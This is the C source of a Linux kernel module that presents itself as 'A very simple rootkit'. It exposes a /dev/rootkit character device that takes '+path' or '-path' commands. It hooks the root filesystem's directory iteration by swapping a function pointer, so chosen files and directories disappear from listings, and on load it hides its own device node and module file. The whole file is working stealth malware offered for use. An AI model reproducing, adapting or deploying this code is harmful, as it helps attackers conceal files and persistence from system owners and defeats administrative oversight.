#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/sched.h>

#define MAX_FULLPATH     512
#define DEVICE_MAJOR     1337
#define DEVICE_NAME      "rootkit"
#define CLASS_NAME       "rk"

static int enable_debug = 0;

module_param(enable_debug, int, S_IRUGO|S_IWUSR);

#define alert(format, args...) printk(KERN_ALERT "%s: " format "\n", DEVICE_NAME, ##args)
#define info(format, args...)  printk(KERN_INFO "%s: " format "\n", DEVICE_NAME, ##args)

#define debug(format, args...) if (enable_debug) { printk(KERN_INFO "%s: " format "\n", __func__, ##args); }

struct hidden_path {
	char *name;
	struct list_head list;
};

LIST_HEAD(hidden_paths);

static int (*orig_root_iterate)(struct file *file, struct dir_context *);
static int (*root_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);

DEFINE_RWLOCK(rk_rwlock);

static struct class* rk_class = NULL;
static struct device* rk_device = NULL;

static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);

static struct file_operations fops = {
	.read = dev_read,
	.write = dev_write,
};

void hide_file(const char *name, size_t length)
{
	struct hidden_path *hp;
	int i;

	if (name[0] != '/') {
		return;
	}

	for (i = 0; i < length && name[i] && name[i] != '\n'; i++);
	for (--i; i > 0 && name[i] == '/'; i--);

	if (i++ < 1) {
		return;
	}

	if (unlikely(!(hp = kmalloc(sizeof(*hp), GFP_KERNEL)))) {
		return;
	}

	if (unlikely(!(hp->name = kmalloc(i + 1, GFP_KERNEL)))) {
		kfree(hp);
		return;
	}

	memcpy(hp->name, name, i);
	hp->name[i] = '\0';

	debug("Hidding '%s'", hp->name);

	write_lock(&rk_rwlock);
	list_add_tail(&hp->list, &hidden_paths);
	write_unlock(&rk_rwlock);
}

void unhide_file(const char *name, size_t length)
{
	struct hidden_path *hp;
	int i;

	debug("Unhidding '%s'", name);

	for (i = 0; i < length && name[i] && name[i] != '\n'; i++);

	write_lock(&rk_rwlock);
	list_for_each_entry(hp, &hidden_paths, list)
	{
		if (!strncmp(name, hp->name, i) && strlen(hp->name) == i)
		{
			debug("%s unhidden", name);
			kfree(hp->name);
			list_del(&hp->list);
			break;
		}
	}
	write_unlock(&rk_rwlock);
}

void list_hidden_paths(void)
{
	struct hidden_path *hp;
	unsigned i = 0;

	info("Hidden files:");

	read_lock(&rk_rwlock);
	list_for_each_entry(hp, &hidden_paths, list) {
		info("[%d] '%s'", i++, hp->name);
	}
	read_unlock(&rk_rwlock);
}

static void resolve_path(const struct dentry *dentry, char *dest, size_t destlen)
{
	size_t cur_len;

	*dest = '\0';

	if (!destlen || !dentry) {
		return;
	}

	if (*dentry->d_name.name != '/') {
		cur_len = strlen(dentry->d_name.name);

		if (destlen < cur_len + 1) {
			return;
		}

		if (dentry->d_parent && *dentry->d_parent->d_name.name != '/') {
			resolve_path(dentry->d_parent, dest, destlen - cur_len);
		}

		strcat(dest, "/");
	}

	strcat(dest, dentry->d_name.name);
}

static int hook_root_filldir(struct dir_context *dir, const char *name, int namelen,
                             loff_t offset, u64 ino, unsigned d_type)
{
	struct hidden_path *hp;
	char *basename;

	debug("Checking '%s'", name);

	read_lock(&rk_rwlock);
	list_for_each_entry(hp, &hidden_paths, list)
	{
		if ((basename = strrchr(hp->name, '/'))) {
			if (!strcmp(name, basename + 1))
			{
				debug("Match: '%s' vs '%s'", name, hp->name);

				read_unlock(&rk_rwlock);
				return 0;
			}
		}
	}
	read_unlock(&rk_rwlock);

	return root_filldir(dir, name, namelen, offset, ino, d_type);
}

int hook_root_iterate(struct file *file, struct dir_context *ctx)
{
	char fullpath[MAX_FULLPATH];
	struct hidden_path *hp;
	size_t fp_len;
	size_t hp_len;
	int do_hook_filldir = 0;

	resolve_path(file->f_path.dentry, fullpath, sizeof(fullpath) - 2);
	fp_len = strlen(fullpath);

	if (fp_len > 1) {
		strcat(fullpath, "/");
	}

	read_lock(&rk_rwlock);
	list_for_each_entry(hp, &hidden_paths, list)
	{
		hp_len = strlen(hp->name);

		if (!strncmp(hp->name, fullpath, hp_len) && fullpath[hp_len] == '/') {
			debug("'%s' is a hidden (sub)directory of '%s'. Hide everything.", fullpath, hp->name);
			read_unlock(&rk_rwlock);
			return 0;
		}

		if (!strncmp(hp->name, fullpath, fp_len) &&
			!strchr(hp->name + fp_len + 1, '/'))
		{
			debug("'%s' (hidden) is in '%s'. Enable hook on filldir.", hp->name, fullpath);
			do_hook_filldir = 1;
		}
	}
	read_unlock(&rk_rwlock);

	if (do_hook_filldir) {
		root_filldir = ctx->actor;
		*((filldir_t *)&ctx->actor) = hook_root_filldir;
	}

	return orig_root_iterate(file, ctx);
}

void *hook_vfs_iterate(const char *path, void *hook_func)
{
	void *ret;
	int (* const *tmp)(struct file *, struct dir_context *);
	struct file *filep;

	if ((filep = filp_open(path, O_RDONLY, 0)) == NULL) {
		return NULL;
	}

	tmp = &(filep->f_op->iterate);
	ret = (void *)xchg((unsigned long *)tmp, (unsigned long)hook_func);

	filp_close(filep, 0);

	return ret;
}

static ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
{
	list_hidden_paths();

	return 0;
}

static ssize_t dev_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
{
	if (len < 2 || (buffer[0] != '+' && buffer[0] != '-')) {
		return -EINVAL;
	}

	if (buffer[0] == '+') {
		hide_file(buffer + 1, len - 1);
	} else {
		unhide_file(buffer + 1, len - 1);
	}

	return len;
}

static int __init rootkit_register(void)
{
	const char device_path[] = "/dev/" DEVICE_NAME;
	const char module_path[] = "/lib/modules/" DEVICE_NAME ".ko";
	int ret;

	if ((ret = register_chrdev(DEVICE_MAJOR, DEVICE_NAME, &fops)) < 0) {
		alert("rootkit failed to register a major number\n");
		return ret;
	}

	rk_class = class_create(THIS_MODULE, CLASS_NAME);

	if (IS_ERR(rk_class)) {
		unregister_chrdev(DEVICE_MAJOR, DEVICE_NAME);
		alert("Failed to register device class");
		return PTR_ERR(rk_class);
	}

	rk_device = device_create(rk_class, NULL, MKDEV(DEVICE_MAJOR, 0), NULL, DEVICE_NAME);

	if (IS_ERR(rk_device)) {
		class_destroy(rk_class);
		unregister_chrdev(DEVICE_MAJOR, DEVICE_NAME);
		alert("Failed to create the device");
		return PTR_ERR(rk_device);
	}

	info("registered");

	hide_file(device_path, sizeof(device_path));
	hide_file(module_path, sizeof(module_path));

	orig_root_iterate = hook_vfs_iterate("/", &hook_root_iterate);

	info("Rookit initialized");

	return 0;
}

static void __exit rootkit_unregister(void)
{
	struct hidden_path *hp;

	device_destroy(rk_class, MKDEV(DEVICE_MAJOR, 0));
	class_unregister(rk_class);
	class_destroy(rk_class);
	unregister_chrdev(DEVICE_MAJOR, DEVICE_NAME);
	info("unregistered");

	write_lock(&rk_rwlock);
	list_for_each_entry(hp, &hidden_paths, list)
	{
		kfree(hp->name);
		list_del(&hp->list);
	}
	write_unlock(&rk_rwlock);

	hook_vfs_iterate("/", orig_root_iterate);

	info("uninitialized");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("awe");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("A very simple rootkit. Some parts of this are based on 'suckerusu' :)");

module_init(rootkit_register);
module_exit(rootkit_unregister);
